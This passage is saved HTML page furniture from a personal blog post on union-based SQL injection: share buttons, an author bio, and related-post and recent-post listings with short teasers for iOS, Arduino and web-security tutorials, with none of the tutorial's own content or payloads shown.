+        <li id="tumblr"> <a target="_blank" onclick="popup = window.open(&#39;http://www.tumblr.com/share/link?url=http%3A%2F%2Fwww.danieledonzelli.com%2Fethical-hacking%2Fsql-injection-union-based%2F&amp;name=SQL Injection – Union Based&amp;description=In+this+tutorial+i%26%238217%3Bll+show+you+how+sql+injection+works+and+how+to+use+it+to+extract+information+from+the+database.+The+UNION+operator+is+used+in+SQL+injections+to+join+a+query%2C+purposely+forged+by+the+tester%2C+to+the+original+query.+The+result+of+the+forged+query+will+be+joined+to+the+result+of%3Cbr%2F%3E%3Ca+href%3D%22http%3A%2F%2Fwww.danieledonzelli.com%2Fethical-hacking%2Fsql-injection-union-based%2F%22+class%3D%22more%22%3ERead+more%3C%2Fa%3E&#39;, &#39;PopupPage&#39;, &#39;height=450,width=500,scrollbars=yes,resizable=yes&#39;); return false" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#"><i class="fa fa-tumblr"></i></a>
+         </li>
+        <li id="gplus"> <a target="_blank" onclick="popup = window.open(&#39;https://plus.google.com/share?url=http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/&amp;title=SQL Injection – Union Based&#39;, &#39;PopupPage&#39;, &#39;height=450,width=500,scrollbars=yes,resizable=yes&#39;); return false" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#"><i class="fa fa-google-plus"></i></a>
+         </li>
+        <li id="member_email"> <a target="_blank" onclick="popup = window.open(&#39;mailto:?subject=SQL Injection – Union Based&amp;body=http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/&#39;, &#39;PopupPage&#39;, &#39;height=450,width=500,scrollbars=yes,resizable=yes&#39;); return false" href="http://www.danieledonzelli.com/ethical-hacking/sql-injection-union-based/#"><i class="fa fa-envelope-o"></i></a>
+         </li>
+      </ul>
+    </div>
+	
+	</div></div>
+    
+	
+
+
+<div id="author-bio">
+				<img src="./SQL Injection - Union Based - Daniele Donzelli_files/1-103x103.jpg" width="103" height="103" alt="Dany" class="avatar avatar-103 wp-user-avatar wp-user-avatar-103 alignnone photo" scale="0">								<div id="author-info">
+									<h3>Dany</h3>
+									<p>I'm tech enthusiast, i love learning and experimenting new things. My main interests are <strong>iOS Development</strong>, <strong>Arduino</strong> and <strong>Ethical Hacking</strong>, but i also like to experiment other languages like Python, Java, PHP and Android Development.</p>
+								<a href="http://www.danieledonzelli.com/author/dany/" class="author_posts_link">More posts by Dany </a>								</div>
+							</div>
+
+
+
+
+
+
+
+
+
+		<div class="single_post_related_carousel"><script type="text/javascript" charset="utf-8">
+		var j$ = jQuery;
+		j$.noConflict();
+		"use strict";
+	//setup up Carousel
+		j$(window).load(function() {
+		j$(".rp_sc ul").carouFredSel({
+					responsive: true,
+					width: "100%",
+					scroll: 1,
+					prev: ".related_left",
+					next: ".related_right",
+					auto: false,
+					items: {
+						width: 310,
+						height: "variable",
+						//	height: "30%",	//	optionally resize item-height
+						visible: {
+							min: 1,
+							max: 3
+						}
+					}
+				});
+				});
+	</script>
+	
+	<h2 class="single_related">Related Post</h2>
+	<div class="related_nav">
+  <p class="related_left" style="margin-bottom: 0px; display: block;"></p>
+  <p class="related_right" style="margin-bottom: 0px; display: block;"></p>
+</div>
+	<div class="rp_sc">
+<div class="caroufredsel_wrapper" style="display: block; text-align: start; float: none; position: relative; top: auto; right: auto; bottom: auto; left: auto; z-index: auto; width: 870px; height: 581px; margin: 0px; overflow: hidden;"><ul style="text-align: left; float: none; position: absolute; top: 0px; right: auto; bottom: auto; left: 0px; margin: 0px; width: 5510px; height: 605px;">      <!-- related post -->
+
+      <li class="blog_related_post brsc" style="width: 290px;">
+      
+     <div class="post">
+
+<div class="post-attachement"><img width="600" height="490" src="./SQL Injection - Union Based - Daniele Donzelli_files/UIButtonFeatured-600x490.png" class="attachment-600x490 size-600x490 wp-post-image" alt="" srcset="https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/UIButtonFeatured.png?resize=600%2C490 600w, https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/UIButtonFeatured.png?zoom=2&amp;resize=600%2C490 1200w, https://i0.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/UIButtonFeatured.png?zoom=3&amp;resize=600%2C490 1800w" sizes="(max-width: 600px) 100vw, 600px" data-attachment-id="42" data-permalink="http://www.danieledonzelli.com/ios/uibutton-tutorial/attachment/uibuttonfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/UIButtonFeatured.png" data-orig-size="4267,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="UIButtonFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/UIButtonFeatured-300x225.png" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/UIButtonFeatured-1024x768.png"></div><div class="sep_25"></div>  <div class="post_ctn"> 
+    <!-- .title -->
+    <div class="post-title">
+      <h2><a href="http://www.danieledonzelli.com/ios/uibutton-tutorial/" class="tiptip">
+        UIButton Tutorial        </a></h2>
+    </div>
+     <!-- .title END--> 
+     <!-- post-info-top -->     
+    <div class="post-info">By <a href="http://www.danieledonzelli.com/author/dany/" title="Posts by Dany" rel="author">Dany</a>    |    <a href="http://www.danieledonzelli.com/ios/uibutton-tutorial/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="33 http://danieledonzelli.com/?p=33">0 Comments</a></div>
+     
+    <!-- post-info END-->     
+    <!-- .entry -->    
+    <div class="entry">
+      <p>In this tutorial i’ll show you how to create an UIButton in an iOS application. You can create a button in two ways, programmatically and with Interface Builder. Create a new Xcode Project, new Single<a href="http://www.danieledonzelli.com/ios/uibutton-tutorial/" class="more-link">Read more</a></p>
+<p style="margin-bottom: 0px;"></p>    </div>   
+    <!-- .entry END --> 
+     </div>
+	</div>
+	<!-- .post-content END--> 
+	<!-- .post END -->
+      </li>
+
+            <!-- related post -->
+
+      <li class="blog_related_post brsc" style="width: 290px;">
+      
+     <div class="post">
+
+<div class="post-attachement"><img width="600" height="490" src="./SQL Injection - Union Based - Daniele Donzelli_files/UITextFieldFeatured-600x490.png" class="attachment-600x490 size-600x490 wp-post-image" alt="" srcset="https://i1.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/UITextFieldFeatured.png?resize=600%2C490 600w, https://i1.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/UITextFieldFeatured.png?zoom=2&amp;resize=600%2C490 1200w, https://i1.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/UITextFieldFeatured.png?zoom=3&amp;resize=600%2C490 1800w" sizes="(max-width: 600px) 100vw, 600px" data-attachment-id="74" data-permalink="http://www.danieledonzelli.com/uitextfieldfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/UITextFieldFeatured.png" data-orig-size="4267,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="UITextFieldFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/UITextFieldFeatured-300x225.png" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/UITextFieldFeatured-1024x768.png"></div><div class="sep_25"></div>  <div class="post_ctn"> 
+    <!-- .title -->
+    <div class="post-title">
+      <h2><a href="http://www.danieledonzelli.com/ios/uitextfield-tutorial/" class="tiptip">
+        UITextField Tutorial        </a></h2>
+    </div>
+     <!-- .title END--> 
+     <!-- post-info-top -->     
+    <div class="post-info">By <a href="http://www.danieledonzelli.com/author/dany/" title="Posts by Dany" rel="author">Dany</a>    |    <a href="http://www.danieledonzelli.com/ios/uitextfield-tutorial/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="69 http://www.danieledonzelli.com/?p=69">0 Comments</a></div>
+     
+    <!-- post-info END-->     
+    <!-- .entry -->    
+    <div class="entry">
+      <p>UITextField is the component that is used to get user input. In this tutorial i’ll show you how to create an UITextField, in Interface Builder and programmatically, then we will use the UITextFieldDelegate methods. We<a href="http://www.danieledonzelli.com/ios/uitextfield-tutorial/" class="more-link">Read more</a></p>
+<p style="margin-bottom: 0px;"></p>    </div>   
+    <!-- .entry END --> 
+     </div>
+	</div>
+	<!-- .post-content END--> 
+	<!-- .post END -->
+      </li>
+
+            <!-- related post -->
+
+      <li class="blog_related_post brsc" style="width: 290px;">
+      
+     <div class="post">
+
+<div class="post-attachement"><img width="600" height="490" src="./SQL Injection - Union Based - Daniele Donzelli_files/BlinkFeatured-600x490.png" class="attachment-600x490 size-600x490 wp-post-image" alt="" data-attachment-id="128" data-permalink="http://www.danieledonzelli.com/arduino/blinking-led/attachment/blinkfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/BlinkFeatured.png" data-orig-size="1024,768" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="BlinkFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/BlinkFeatured-300x225.png" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/BlinkFeatured-1024x768.png" scale="0"></div><div class="sep_25"></div>  <div class="post_ctn"> 
+    <!-- .title -->
+    <div class="post-title">
+      <h2><a href="http://www.danieledonzelli.com/arduino/blinking-led/" class="tiptip">
+        Blinking LED        </a></h2>
+    </div>
+     <!-- .title END--> 
+     <!-- post-info-top -->     
+    <div class="post-info">By <a href="http://www.danieledonzelli.com/author/dany/" title="Posts by Dany" rel="author">Dany</a>    |    <a href="http://www.danieledonzelli.com/arduino/blinking-led/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="126 http://www.danieledonzelli.com/?p=126">0 Comments</a></div>
+     
+    <!-- post-info END-->     
+    <!-- .entry -->    
+    <div class="entry">
+      <p>In this tutorial i’ll show you how to blink a LED with Arduino. The Arduino pin voltage is too high for a LED, so we have to put a resistor. CHOOSE THE RESISTOR To choose<a href="http://www.danieledonzelli.com/arduino/blinking-led/" class="more-link">Read more</a></p>
+<p style="margin-bottom: 0px;"></p>    </div>   
+    <!-- .entry END --> 
+     </div>
+	</div>
+	<!-- .post-content END--> 
+	<!-- .post END -->
+      </li>
+
+            <!-- related post -->
+
+      <li class="blog_related_post brsc" style="width: 290px;">
+      
+     <div class="post">
+
+<div class="post-attachement"><img width="600" height="490" src="./SQL Injection - Union Based - Daniele Donzelli_files/bwappFeatured-copia-600x490.jpg" class="attachment-600x490 size-600x490 wp-post-image" alt="" srcset="https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/bwappFeatured-copia.jpg?resize=600%2C490 600w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/bwappFeatured-copia.jpg?zoom=2&amp;resize=600%2C490 1200w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/bwappFeatured-copia.jpg?zoom=3&amp;resize=600%2C490 1800w" sizes="(max-width: 600px) 100vw, 600px" data-attachment-id="142" data-permalink="http://www.danieledonzelli.com/bwappfeatured-copia/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/bwappFeatured-copia.jpg" data-orig-size="4342,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="bwappFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/bwappFeatured-copia-300x221.jpg" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/bwappFeatured-copia-1024x755.jpg"></div><div class="sep_25"></div>  <div class="post_ctn"> 
+    <!-- .title -->
+    <div class="post-title">
+      <h2><a href="http://www.danieledonzelli.com/ethical-hacking/bwapp-web-application-pentest-lab/" class="tiptip">
+        bWAPP – Web Application Pentest Lab        </a></h2>
+    </div>
+     <!-- .title END--> 
+     <!-- post-info-top -->     
+    <div class="post-info">By <a href="http://www.danieledonzelli.com/author/dany/" title="Posts by Dany" rel="author">Dany</a>    |    <a href="http://www.danieledonzelli.com/ethical-hacking/bwapp-web-application-pentest-lab/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="137 http://www.danieledonzelli.com/?p=137">2 Comments</a></div>
+     
+    <!-- post-info END-->     
+    <!-- .entry -->    
+    <div class="entry">
+      <p>bWAPP is a PHP application that uses a MySQL database. It has over 100 web vulnerabilities! It covers all major known web bugs, including all risks from the OWASP Top 10 project. bWAPP can be<a href="http://www.danieledonzelli.com/ethical-hacking/bwapp-web-application-pentest-lab/" class="more-link">Read more</a></p>
+<p style="margin-bottom: 0px;"></p>    </div>   
+    <!-- .entry END --> 
+     </div>
+	</div>
+	<!-- .post-content END--> 
+	<!-- .post END -->
+      </li>
+
+            <!-- related post -->
+
+      <li class="blog_related_post brsc" style="width: 290px;">
+      
+     <div class="post">
+
+<div class="post-attachement"><img width="600" height="490" src="./SQL Injection - Union Based - Daniele Donzelli_files/xssReflectedFeatured-600x490.jpg" class="attachment-600x490 size-600x490 wp-post-image" alt="" srcset="https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/xssReflectedFeatured.jpg?resize=600%2C490 600w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/xssReflectedFeatured.jpg?zoom=2&amp;resize=600%2C490 1200w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/04/xssReflectedFeatured.jpg?zoom=3&amp;resize=600%2C490 1800w" sizes="(max-width: 600px) 100vw, 600px" data-attachment-id="157" data-permalink="http://www.danieledonzelli.com/xssreflectedfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/xssReflectedFeatured.jpg" data-orig-size="4342,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="xssReflectedFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/xssReflectedFeatured-300x221.jpg" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/04/xssReflectedFeatured-1024x755.jpg"></div><div class="sep_25"></div>  <div class="post_ctn"> 
+    <!-- .title -->
+    <div class="post-title">
+      <h2><a href="http://www.danieledonzelli.com/ethical-hacking/xss-reflected/" class="tiptip">
+        XSS Reflected        </a></h2>
+    </div>
+     <!-- .title END--> 
+     <!-- post-info-top -->     
+    <div class="post-info">By <a href="http://www.danieledonzelli.com/author/dany/" title="Posts by Dany" rel="author">Dany</a>    |    <a href="http://www.danieledonzelli.com/ethical-hacking/xss-reflected/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="152 http://www.danieledonzelli.com/?p=152">1 Comment</a></div>
+     
+    <!-- post-info END-->     
+    <!-- .entry -->    
+    <div class="entry">
+      <p>Reflected XSS is the most common type of XSS. It occurs when the malicious payload is part of the request that the victim’s browser sends to the vulnerable site. This type of attack is called<a href="http://www.danieledonzelli.com/ethical-hacking/xss-reflected/" class="more-link">Read more</a></p>
+<p style="margin-bottom: 0px;"></p>    </div>   
+    <!-- .entry END --> 
+     </div>
+	</div>
+	<!-- .post-content END--> 
+	<!-- .post END -->
+      </li>
+
+            <!-- related post -->
+
+      <li class="blog_related_post brsc" style="width: 290px;">
+      
+     <div class="post">
+
+<div class="post-attachement"><img width="600" height="490" src="./SQL Injection - Union Based - Daniele Donzelli_files/UISwitchFeatured-600x490.png" class="attachment-600x490 size-600x490 wp-post-image" alt="" srcset="https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/05/UISwitchFeatured.png?resize=600%2C490 600w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/05/UISwitchFeatured.png?zoom=2&amp;resize=600%2C490 1200w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/05/UISwitchFeatured.png?zoom=3&amp;resize=600%2C490 1800w" sizes="(max-width: 600px) 100vw, 600px" data-attachment-id="171" data-permalink="http://www.danieledonzelli.com/uiswitchfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/05/UISwitchFeatured.png" data-orig-size="4267,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="UISwitchFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/05/UISwitchFeatured-300x225.png" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/05/UISwitchFeatured-1024x768.png"></div><div class="sep_25"></div>  <div class="post_ctn"> 
+    <!-- .title -->
+    <div class="post-title">
+      <h2><a href="http://www.danieledonzelli.com/ios/uiswitch-tutorial/" class="tiptip">
+        UISwitch Tutorial        </a></h2>
+    </div>
+     <!-- .title END--> 
+     <!-- post-info-top -->     
+    <div class="post-info">By <a href="http://www.danieledonzelli.com/author/dany/" title="Posts by Dany" rel="author">Dany</a>    |    <a href="http://www.danieledonzelli.com/ios/uiswitch-tutorial/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="165 http://www.danieledonzelli.com/?p=165">1 Comment</a></div>
+     
+    <!-- post-info END-->     
+    <!-- .entry -->    
+    <div class="entry">
+      <p>In this tutorial i’ll show you how to create (Interface builder and programmatically) and how to use UISwitch in an iOS application. Create a new Xcode Project, new Single View Application In Product Name insert<a href="http://www.danieledonzelli.com/ios/uiswitch-tutorial/" class="more-link">Read more</a></p>
+<p style="margin-bottom: 0px;"></p>    </div>   
+    <!-- .entry END --> 
+     </div>
+	</div>
+	<!-- .post-content END--> 
+	<!-- .post END -->
+      </li>
+
+            <!-- related post -->
+
+      <li class="blog_related_post brsc" style="width: 290px;">
+      
+     <div class="post">
+
+<div class="post-attachement"><img width="600" height="490" src="./SQL Injection - Union Based - Daniele Donzelli_files/PushButtonFeatured-600x490.png" class="attachment-600x490 size-600x490 wp-post-image" alt="" data-attachment-id="174" data-permalink="http://www.danieledonzelli.com/arduino/push-button/attachment/pushbuttonfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/05/PushButtonFeatured.png" data-orig-size="1024,768" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="PushButtonFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/05/PushButtonFeatured-300x225.png" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/05/PushButtonFeatured-1024x768.png" scale="0"></div><div class="sep_25"></div>  <div class="post_ctn"> 
+    <!-- .title -->
+    <div class="post-title">
+      <h2><a href="http://www.danieledonzelli.com/arduino/push-button/" class="tiptip">
+        Push Button        </a></h2>
+    </div>
+     <!-- .title END--> 
+     <!-- post-info-top -->     
+    <div class="post-info">By <a href="http://www.danieledonzelli.com/author/dany/" title="Posts by Dany" rel="author">Dany</a>    |    <a href="http://www.danieledonzelli.com/arduino/push-button/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="173 http://www.danieledonzelli.com/?p=173">0 Comments</a></div>
+     
+    <!-- post-info END-->     
+    <!-- .entry -->    
+    <div class="entry">
+      <p>In this tutorial i’ll show you how to use a button with Arduino. With the same circuit we will use the button in two different ways. In the first way, we will turn on the<a href="http://www.danieledonzelli.com/arduino/push-button/" class="more-link">Read more</a></p>
+<p style="margin-bottom: 0px;"></p>    </div>   
+    <!-- .entry END --> 
+     </div>
+	</div>
+	<!-- .post-content END--> 
+	<!-- .post END -->
+      </li>
+
+            <!-- related post -->
+
+      <li class="blog_related_post brsc" style="width: 290px;">
+      
+     <div class="post">
+
+<div class="post-attachement"><img width="600" height="490" src="./SQL Injection - Union Based - Daniele Donzelli_files/Serial-600x490.png" class="attachment-600x490 size-600x490 wp-post-image" alt="" data-attachment-id="195" data-permalink="http://www.danieledonzelli.com/serial/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/05/Serial.png" data-orig-size="1024,768" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Serial" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/05/Serial-300x225.png" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/05/Serial-1024x768.png" scale="0"></div><div class="sep_25"></div>  <div class="post_ctn"> 
+    <!-- .title -->
+    <div class="post-title">
+      <h2><a href="http://www.danieledonzelli.com/arduino/serial-port/" class="tiptip">
+        Serial Port        </a></h2>
+    </div>
+     <!-- .title END--> 
+     <!-- post-info-top -->     
+    <div class="post-info">By <a href="http://www.danieledonzelli.com/author/dany/" title="Posts by Dany" rel="author">Dany</a>    |    <a href="http://www.danieledonzelli.com/arduino/serial-port/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="194 http://www.danieledonzelli.com/?p=194">0 Comments</a></div>
+     
+    <!-- post-info END-->     
+    <!-- .entry -->    
+    <div class="entry">
+      <p>In this tutorial i’ll show you how to communicate with the serial port. We will write a simple sketch that if you send the “a” character, it will turn on the LED, instead, if you<a href="http://www.danieledonzelli.com/arduino/serial-port/" class="more-link">Read more</a></p>
+<p style="margin-bottom: 0px;"></p>    </div>   
+    <!-- .entry END --> 
+     </div>
+	</div>
+	<!-- .post-content END--> 
+	<!-- .post END -->
+      </li>
+
+      
+      
+    </ul></div>
+
+  </div>
+</div>
+
+<div id="disqus_thread"><iframe id="dsq-app6495" name="dsq-app6495" allowtransparency="true" frameborder="0" scrolling="no" tabindex="0" title="Disqus" width="100%" src="./SQL Injection - Union Based - Daniele Donzelli_files/saved_resource.html" style="width: 1px !important; min-width: 100% !important; border: none !important; overflow: hidden !important; height: 655px !important;" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
+ 
+  </div>
+  
+  <!-- #posts END -->
+  
+          <div id="sidebar" class=" right_sb">
+      <div id="search-2" class="sb_widget  widget_search"><div id="search">
+
+				<form method="get" action="http://www.danieledonzelli.com/"><input type="text" name="s" placeholder="Search" class="search" value=""><input type="submit" id="searchsubmit" value=""></form>
+
+			</div></div><div id="rd_s_blog_widget-2" class="sb_widget  rd_s_blog_widget"> 
+	    <h3>Recent Posts</h3>          
+                <ul class="rd_widget_recent_entries">
+  					                                        <li>                        
+                    					<div class="thumbnail">
+					<a title="" href="http://www.danieledonzelli.com/ethical-hacking/blind-sql-injection-boolean-based/"><img width="200" height="160" src="./SQL Injection - Union Based - Daniele Donzelli_files/BlindBoolFeatured-200x160.jpg" class="attachment-200x160 size-200x160 wp-post-image" alt="" srcset="https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured.jpg?resize=200%2C160 200w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured.jpg?zoom=2&amp;resize=200%2C160 400w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured.jpg?zoom=3&amp;resize=200%2C160 600w" sizes="(max-width: 200px) 100vw, 200px" data-attachment-id="287" data-permalink="http://www.danieledonzelli.com/blindboolfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured.jpg" data-orig-size="4342,3200" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="BlindBoolFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured-300x221.jpg" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/08/BlindBoolFeatured-1024x755.jpg"></a>
+					</div>
+
+										<div class="widget_recent_entry">
+                    <div class="w_date">7 August, 2016</div><div class="w_comment"><a href="http://www.danieledonzelli.com/ethical-hacking/blind-sql-injection-boolean-based/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="286 http://www.danieledonzelli.com/?p=286">1 Comment</a></div>	             			
+					<h4>
+					<a href="http://www.danieledonzelli.com/ethical-hacking/blind-sql-injection-boolean-based/" rel="bookmark" title=""> 
+					Blind SQL Injection – Boolean based					</a>
+					</h4>
+                    </div>
+	                </li>
+                                        <li>                        
+                    					<div class="thumbnail">
+					<a title="" href="http://www.danieledonzelli.com/arduino/control-led-brightness-potentiometer/"><img width="200" height="160" src="./SQL Injection - Union Based - Daniele Donzelli_files/PotenzFeatured-200x160.png" class="attachment-200x160 size-200x160 wp-post-image" alt="" srcset="https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured.png?resize=200%2C160 200w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured.png?zoom=2&amp;resize=200%2C160 400w, https://i2.wp.com/www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured.png?zoom=3&amp;resize=200%2C160 600w" sizes="(max-width: 200px) 100vw, 200px" data-attachment-id="280" data-permalink="http://www.danieledonzelli.com/arduino/control-led-brightness-potentiometer/attachment/potenzfeatured/" data-orig-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured.png" data-orig-size="3264,2448" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="PotenzFeatured" data-image-description="" data-medium-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured-300x225.png" data-large-file="http://www.danieledonzelli.com/wp-content/uploads/2016/07/PotenzFeatured-1024x768.png"></a>
+					</div>
+
+										<div class="widget_recent_entry">
+                    <div class="w_date">15 July, 2016</div><div class="w_comment"><a href="http://www.danieledonzelli.com/arduino/control-led-brightness-potentiometer/#disqus_thread" class="comments-link tiptip" data-disqus-identifier="279 http://www.danieledonzelli.com/?p=279">0 Comments</a></div>	             			
+					<h4>
